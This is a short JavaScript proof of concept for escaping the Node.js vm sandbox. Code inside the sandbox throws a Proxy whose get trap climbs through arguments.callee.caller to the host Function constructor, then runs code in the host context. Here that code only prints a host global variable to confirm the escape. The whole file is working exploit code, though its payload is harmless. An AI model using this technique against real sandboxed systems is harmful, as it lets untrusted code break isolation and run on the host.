vm = require('vm');
sauce = "laser";

const code5 = `throw new Proxy({}, {
    get: function(me, key) {
       const cc = arguments.callee.caller;
       if (cc != null) {
          (cc.constructor.constructor('console.log(sauce)'))();
       }
       return me[key];
    }
})`;
  
  
try {
    vm.runInContext(code5, vm.createContext(Object.create(null)));
}
catch(e) {
    console.log("We see laser with undefined if escape is successful")
    console.log(e.somekey);
}